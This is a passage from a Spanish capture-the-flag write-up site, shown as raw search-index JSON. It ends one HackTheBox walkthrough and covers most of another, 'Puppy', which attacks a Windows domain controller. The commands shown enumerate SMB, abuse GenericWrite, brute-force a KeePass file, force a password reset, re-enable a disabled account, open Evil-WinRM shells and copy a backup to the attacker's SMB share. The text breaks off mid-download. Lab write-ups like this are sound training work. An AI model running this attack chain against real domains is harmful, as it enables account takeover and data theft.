class=\"line\"\u003e\u003cspan class=\"cl\"\u003eby OJ Reeves \u003cspan class=\"o\"\u003e(\u003c/span\u003e@TheColonial\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e Christian Mehlmauer \u003cspan class=\"o\"\u003e(\u003c/span\u003e@firefart\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Url:                     http://nocturnal.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Method:                  GET\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Threads:                 \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Negative Status codes:   \u003cspan class=\"m\"\u003e404\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e User Agent:              gobuster/3.6\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Follow Redirect:         \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Timeout:                 \u003cspan class=\"nv\"\u003e10s\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting gobuster in directory enumeration \u003cspan class=\"nv\"\u003emode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/uploads              \u003cspan class=\"o\"\u003e(\u003c/span\u003eStatus: 403\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eSize: 162\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/backups              \u003cspan class=\"o\"\u003e(\u003c/span\u003eStatus: 403\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eSize: 162\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/uploads2             \u003cspan class=\"o\"\u003e(\u003c/span\u003eStatus: 403\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eSize: 162\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eProgress: \u003cspan class=\"m\"\u003e220559\u003c/span\u003e / \u003cspan class=\"m\"\u003e220560\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e100.00%\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eFinished\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eEn un principio vemos una p√°gina normal y corriente que tiene un panel de registro y otro de login. Por el momento vamos a crear una cuenta para ver el dashboard que nos muestra.\u003c/p\u003e","title":"Nocutrnal"},{"content":"M√°quina Medium - Windows | Credenciales levi.james / KingofAkron2025!\nReconocimiento ‚ùØ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.70 -oG ports [sudo] contrase√±a para borhub: Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 09:32 CEST Initiating SYN Stealth Scan at 09:32 Scanning 10.10.11.70 [65535 ports] Discovered open port 135/tcp on 10.10.11.70 Discovered open port 139/tcp on 10.10.11.70 Discovered open port 111/tcp on 10.10.11.70 Discovered open port 53/tcp on 10.10.11.70 Discovered open port 445/tcp on 10.10.11.70 Discovered open port 3268/tcp on 10.10.11.70 Discovered open port 9389/tcp on 10.10.11.70 Discovered open port 593/tcp on 10.10.11.70 Discovered open port 5985/tcp on 10.10.11.70 Discovered open port 636/tcp on 10.10.11.70 Discovered open port 2049/tcp on 10.10.11.70 Discovered open port 49664/tcp on 10.10.11.70 Discovered open port 63992/tcp on 10.10.11.70 Discovered open port 3260/tcp on 10.10.11.70 Discovered open port 49667/tcp on 10.10.11.70 Discovered open port 64010/tcp on 10.10.11.70 Discovered open port 3269/tcp on 10.10.11.70 Discovered open port 389/tcp on 10.10.11.70 Discovered open port 49670/tcp on 10.10.11.70 Discovered open port 88/tcp on 10.10.11.70 Discovered open port 49669/tcp on 10.10.11.70 Discovered open port 464/tcp on 10.10.11.70 Completed SYN Stealth Scan at 09:32, 26.40s elapsed (65535 total ports) Nmap scan report for 10.10.11.70 Host is up, received user-set (0.052s latency). Scanned at 2025-06-02 09:32:02 CEST for 26s Not shown: 65513 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 3260/tcp open iscsi syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49669/tcp open unknown syn-ack ttl 127 49670/tcp open unknown syn-ack ttl 127 63992/tcp open unknown syn-ack ttl 127 64010/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds Raw packets sent: 131060 (5.767MB) | Rcvd: 34 (1.496KB) ‚ùØ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49669,49670,63992,64010 10.10.11.70 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 09:35 CEST Nmap scan report for puppy.htb (10.10.11.70) Host is up (0.097s latency). Bug in iscsi-info: no string output. PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-02 14:35:30Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 2049/tcp open nlockmgr 1-4 (RPC #100021) 3260/tcp open iscsi? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 63992/tcp open msrpc Microsoft Windows RPC 64010/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m58s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-06-02T14:37:20 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 208.23 seconds Enumeraci√≥n SMB Comprobamos que las credenciales que tenemos sean v√°lidas para smb:\n‚ùØ nxc smb 10.10.11.70 -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! Listado de carpetas compartidas, parece que de momento no tenemos permiso de lectura con la carpeta DEV aunque luego lo comprobaremos:\n‚ùØ nxc smb 10.10.11.70 -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; --shares SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC [*] Enumerated shares SMB 10.10.11.70 445 DC Share Permissions Remark SMB 10.10.11.70 445 DC ----- ----------- ------ SMB 10.10.11.70 445 DC ADMIN$ Remote Admin SMB 10.10.11.70 445 DC C$ Default share SMB 10.10.11.70 445 DC DEV DEV-SHARE for PUPPY-DEVS SMB 10.10.11.70 445 DC IPC$ READ Remote IPC SMB 10.10.11.70 445 DC NETLOGON READ Logon server share SMB 10.10.11.70 445 DC SYSVOL READ Logon server share Listado de usuarios:\n‚ùØ nxc smb 10.10.11.70 -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; --users SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.70 445 DC Administrator 2025-02-19 19:33:28 0 Built-in account for administering the computer/domain SMB 10.10.11.70 445 DC Guest \u0026lt;never\u0026gt; 0 Built-in account for guest access to the computer/domain SMB 10.10.11.70 445 DC krbtgt 2025-02-19 11:46:15 0 Key Distribution Center Service Account SMB 10.10.11.70 445 DC levi.james 2025-02-19 12:10:56 0 SMB 10.10.11.70 445 DC ant.edwards 2025-02-19 12:13:14 0 SMB 10.10.11.70 445 DC adam.silver 2025-06-02 14:34:28 0 SMB 10.10.11.70 445 DC jamie.williams 2025-02-19 12:17:26 0 SMB 10.10.11.70 445 DC steph.cooper 2025-02-19 12:21:00 0 SMB 10.10.11.70 445 DC steph.cooper_adm 2025-03-08 15:50:40 0 SMB 10.10.11.70 445 DC [*] Enumerated 9 local users: PUPPY Ahora nos conectamos a la carpeta compartida DEV pero vemos que no tenemos ning√∫n tipo de permiso:\n‚ùØ smbclient \\\\\\\\10.10.11.70\\\\DEV -U PUPPY.HTB\\\\levi.james Password for [PUPPY.HTB\\levi.james]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u0026gt; ls NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u0026gt; get get \u0026lt;filename\u0026gt; [localname] Procedemos a hacer un escaneo con bloodhound usando las credenciales del usuario levi.james.\nEnumeraci√≥n con bloodhound ‚ùØ bloodhound-python -u levi.james -p \u0026#39;KingofAkron2025!\u0026#39; -d PUPPY.HTB -ns 10.10.11.70 -c all --zip Abusando de privilegios GenericWrite - BloodyAD o Net Rpc Vemos que levi.james es miembro del grupo HR, y el grupo HR tiene permisos GenericWrite sobre el grupo DEVELOPERS. Con lo cual vamos a a√±adir al usuario levi.james al grupo de DEVELOPERS mediante bloodyAD o net rpc.\n‚ùØ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; add groupMember \u0026#39;DEVELOPERS\u0026#39; \u0026#39;levi.james\u0026#39; [+] levi.james added to DEVELOPERS ‚ùØ net rpc group addmem \u0026#34;DEVELOPERS\u0026#34; \u0026#34;levi.james\u0026#34; -U \u0026#34;PUPPY.HTB\u0026#34;/\u0026#34;levi.james\u0026#34;%\u0026#39;KingofAkron2025!\u0026#39; -S \u0026#34;10.10.11.70\u0026#34; Ponemos entre comillas simples la contrase√±a ya que contiene caracteres especiales como \u0026ldquo;!\u0026rdquo;\nAhora que ya hemos a√±adido al usuario levi.james vamos a comprobar si tenemos permisos sobre la carpeta compartida DEV con nxc.\n‚ùØ nxc smb 10.10.11.70 -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; --shares SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC [*] Enumerated shares SMB 10.10.11.70 445 DC Share Permissions Remark SMB 10.10.11.70 445 DC ----- ----------- ------ SMB 10.10.11.70 445 DC ADMIN$ Remote Admin SMB 10.10.11.70 445 DC C$ Default share SMB 10.10.11.70 445 DC DEV READ DEV-SHARE for PUPPY-DEVS SMB 10.10.11.70 445 DC IPC$ READ Remote IPC SMB 10.10.11.70 445 DC NETLOGON READ Logon server share SMB 10.10.11.70 445 DC SYSVOL READ Logon server share Vemos que ahora si que tenemos permisos de lectura y nos conectamos a la carpeta compartida con smbclient.\n‚ùØ smbclient \\\\\\\\10.10.11.70\\\\DEV -U PUPPY.HTB\\\\levi.james Can\u0026#39;t load /etc/samba/smb.conf - run testparm to debug it Password for [PUPPY.HTB\\levi.james]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Sun Mar 23 08:07:57 2025 .. D 0 Sat Mar 8 17:52:57 2025 KeePassXC-2.7.9-Win64.msi A 34394112 Sun Mar 23 08:09:12 2025 Projects D 0 Sat Mar 8 17:53:36 2025 recovery.kdbx A 2677 Wed Mar 12 03:25:46 2025 5080575 blocks of size 4096. 1646472 blocks available Tenemos un archivo .kdbk que es un archivo que almacena credenciales de forma segura y normalmente requiere una contrase√±a o un archivo clave (keyfile).\nComo no tenemos la contrase√±a ni nada parecido vamos a intentar extraer el hash con keepass2jhon y luego crackearlo pero no nos funciona.\n‚ùØ keepass2john recovery.kdbx ! recovery.kdbx : File version \u0026#39;40000\u0026#39; is currently not supported! Ataque por fuerza bruta al archivo .kdbx - Keepass4brute Vamos a probar un ataque por fuerza bruta con keepass4brute.\n‚ùØ /opt/Herramientas/keepass4brute/keepass4brute.sh recovery.kdbx /usr/share/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt keepass4brute 1.3 by r3nt0n https://github.com/r3nt0n/keepass4brute [+] Words tested: 345/1000000 - Attempts per minute: 113 - Estimated time remaining: 6 days, 3 hours [+] Current attempt: liverpool [*] Password found: liverpool Vemos que nos encuentra una coincidencia con la contrase√±a \u0026ldquo;liverpool\u0026rdquo; con lo cual vamos a volver abrir el archivo con keepassxc para comprobar que sea v√°lida.\nAhora que tenemos una lista con unas credenciales vamos a comprobar las credenciales con la lista de usuarios sacada anteriormente con nxc.\nComprobaci√≥n de credenciales con nxc ‚ùØ nxc smb 10.10.11.70 -u \u0026#39;users\u0026#39; -p \u0026#39;passwords\u0026#39; SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\Administrator:JamieLove2025! STATUS_LOGON_FAILURE SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\Guest:JamieLove2025! STATUS_LOGON_FAILURE \u0026lt;SNIP\u0026gt; SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\krbtgt:Antman2025! STATUS_LOGON_FAILURE SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\levi.james:Antman2025! STATUS_LOGON_FAILURE SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\ant.edwards:Antman2025! Ahora que tenemos nuevas credenciales disponibles vamos a volver a mirar el bloodhound para ver que clase de permisos tiene.\nEnumerando los permisos que tiene el usuario ant.edwards vemos que es miembro de SENIOR DEVS que a la vez tiene permisos GenericAll sobre adam.silver.\nKerberoast attack [FAILED] ‚ùØ sudo ntpdate -u 10.10.11.70 [sudo] contrase√±a para borhub: 3 Jun 23:52:00 ntpdate[10694]: adjust time server 10.10.11.70 offset -0.003879 sec ‚ùØ /opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.70 -d \u0026#39;PUPPY.HTB\u0026#39; -u \u0026#39;ant.edwards\u0026#39; -p \u0026#39;Antman2025!\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP Shadow Credential Attack [FAILED] ‚ùØ /opt/Herramientas/pywhisker/pywhisker.py --dc-ip 10.10.11.70 -d \u0026#39;PUPPY.HTB\u0026#39; -u \u0026#39;ant.edwards\u0026#39; -p \u0026#39;Antman2025!\u0026#39; --target \u0026#34;adam.silver\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 50d01920-0320-e928-73a2-9d3796ebeaf4 [*] Updating the msDS-KeyCredentialLink attribute of adam.silver [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: DM4pfjWo.pfx [+] PFX exportiert nach: DM4pfjWo.pfx [i] Passwort f√ºr PFX: ARoPYbPOSeV621UmpShy [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: DM4pfjWo.pfx [*] Must be used with password: ARoPYbPOSeV621UmpShy [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Intentamos ahora con gettgtpkini obtener el TGT pero nos da el siguiente error:\n‚ùØ /opt/Herramientas/PKINITtools/gettgtpkinit.py -cert-pfx DM4pfjWo.pfx -pfx-pass \u0026#39;ARoPYbPOSeV621UmpShy\u0026#39; PUPPY.HTB/adam.silver adam.silver.ccache -dc-ip 10.10.11.70 2025-06-04 00:15:27,177 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-06-04 00:15:27,195 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT Traceback (most recent call last): File \u0026#34;/opt/Herramientas/PKINITtools/gettgtpkinit.py\u0026#34;, line 349, in \u0026lt;module\u0026gt; main() ~~~~^^ File \u0026#34;/opt/Herramientas/PKINITtools/gettgtpkinit.py\u0026#34;, line 345, in main amain(args) ~~~~~^^^^^^ File \u0026#34;/opt/Herramientas/PKINITtools/gettgtpkinit.py\u0026#34;, line 315, in amain res = sock.sendrecv(req) File \u0026#34;/home/borhub/Entornos-Pentesting/pentest-venv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py\u0026#34;, line 85, in sendrecv raise KerberosError(krb_message) minikerberos.protocol.errors.KerberosError: Error Name: KDC_ERR_CLIENT_REVOKED Detail: \u0026#34;Client‚Äôs credentials have been revoked\u0026#34; This might be because of an explicit disabling or because of other restrictions in place on the account. For example: account disabled, expired, or locked out.\nForce Change Password - Net rpc Cambiamos contrase√±a usuario adam.silver - Net rpc\n‚ùØ net rpc password \u0026#34;adam.silver\u0026#34; \u0026#39;micontrafavorita2025!\u0026#39; -U \u0026#34;PUPPY.HTB\u0026#34;/\u0026#34;ant.edwards\u0026#34;%\u0026#39;Antman2025!\u0026#39; -S \u0026#34;10.10.11.70\u0026#34; Intentamos abrir una shell remota y obtenemos un c√≥digo de error:\n‚ùØ evil-winrm -u adam.silver -p micontrase√±afavorita2025! -i 10.10.11.70 Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method \u0026#39;quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Entonces vamos a comprobar con nxc las credenciales y vemos que el estado de la cuenta esta DESHABILITADA. (Tambi√©n lo podr√≠amos haber visto en el bloodhound pero yo no me di cuenta)\n‚ùØ nxc smb 10.10.11.70 -u \u0026#39;adam.silver\u0026#39; -p \u0026#39;micontrase√±afavorita2025!\u0026#39; SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\adam.silver:micontrase√±afavorita2025! STATUS_ACCOUNT_DISABLED Deshabilitar ACCOUNTDISABLE - BloodyAD ‚ùØ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u \u0026#39;ant.edwards\u0026#39; -p \u0026#39;Antman2025!\u0026#39; remove uac \u0026#39;adam.silver\u0026#39; -f ACCOUNTDISABLE [-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from adam.silver\u0026#39;s userAccountControl Una vez quitada la flag ACCOUNTDISABLE volvemos a probar con nxc winrm y nos indica que todo ha ido correctamente.\n‚ùØ nxc winrm 10.10.11.70 -u \u0026#39;adam.silver\u0026#39; -p \u0026#39;micontrase√±afavorita2025!\u0026#39; WINRM 10.10.11.70 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB) WINRM 10.10.11.70 5985 DC [+] PUPPY.HTB\\adam.silver:micontrase√±afavorita2025! (Pwn3d!) Entonces nos creamos una shell con evil-winrm.\n‚ùØ evil-winrm -i 10.10.11.70 -u adam.silver -p \u0026#39;micontrafavorita2025!\u0026#39; Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method \u0026#39;quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\adam.silver\\Documents\u0026gt; type ../Desktop/user.txt 58e2e43ead7d8708ec72dba552fe0e25 Movimiento lateral Una vez tenemos nuestra shell con el usuario adam.silver nos ponemos a enumerar el sistema manualmente. En C:/ nos encontramos la carpeta Backups que dentro tiene un archivo .zip llamado site-backup-2024-12-30.zip, que nos los descargamos a nuestra m√°quina atacante para enumerarlo.\n*Evil-WinRM* PS C:\\\u0026gt; ls Directory: C:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/9/2025 10:48 AM Backups d----- 5/12/2025 5:21 PM inetpub d----- 5/8/2021 1:20 AM PerfLogs d-r--- 4/4/2025 3:40 PM Program Files d----- 5/8/2021 2:40 AM Program Files (x86) d----- 3/8/2025 9:00 AM StorageReports d-r--- 3/8/2025 8:52 AM Users d----- 5/13/2025 4:40 PM Windows *Evil-WinRM* PS C:\\\u0026gt; cd Backups *Evil-WinRM* PS C:\\Backups\u0026gt; ls Directory: C:\\Backups Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/8/2025 8:22 AM 4639546 site-backup-2024-12-30.zip Descarga de archivos con smb server ‚ùØ sudo smbserver.py smbFolder $(pwd) -smb2support [sudo] contrase√±a para borhub: /usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81. import pkg_resources Impacket v0.11.0 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.11.70,62080) [*] AUTHENTICATE_MESSAGE (\\,DC) [*] User DC\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa [*] Connecting Share(1:IPC$) [*] Connecting Share(2:smbFolder) [*] Disconnecting Share(1:IPC$) [*] Disconnecting Share(2:smbFolder) [*] Closing down connection (10.10.11.70,62080) [*] Remaining connections [] *Evil-WinRM* PS C:\\Backups\u0026gt; copy C:\\Backups\\site-backup-2024-12-30.zip \\\\10.10.15.254\\smbFolder\\ Leak Information Una vez tenemos el archivo en nuestra m√°quina lo descomprimimos y enumeramos.\n‚ùØ unzip site-backup-2024-12-30.zip Descubrimos las credenciales del usuario steph.cooper, anteriormente en la enumeraci√≥n de usuarios vimos que steph tenia el usuario normal y el usuario adm. Tratamos de obtener una shell con ambos pero solo la conseguimos con el usuario normal.\n‚ùØ evil-winrm -i 10.10.11.70 -u steph.cooper -p \u0026#39;ChefSteph2025!\u0026#39; Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method \u0026#39;quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents\u0026gt; Escalada de privilegios winPEASx64.exe ‚ùØ wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/winPEASx64.exe --2025-06-07 21:14:47-- https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/winPEASx64.exe Cargado certificado CA \u0026#39;/etc/ssl/certs/ca-certificates.crt\u0026#39; Resolviendo github.com (github.com)... 140.82.121.4 Conectando con github.com (github.com)[140.82.121.4]:443... conectado. Petici√≥n HTTP enviada, esperando respuesta... 302 Found Localizaci√≥n: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/207d3f3e-bc37-4b37-ba85-5c4fa16d48c4?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=releaseassetproduction%2F20250607%2Fus-east-1%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20250607T191444Z\u0026amp;X-Amz-Expires=300\u0026amp;X-Amz-Signature=81be8126c8c0a48b4ad96347f3825ffc8a7c84640cab34ab7df9f980940a22c1\u0026amp;X-Amz-SignedHeaders=host\u0026amp;response-content-disposition=attachment%3B%20filename%3DwinPEASx64.exe\u0026amp;response-content-type=application%2Foctet-stream [siguiendo] --2025-06-07 21:14:48-- 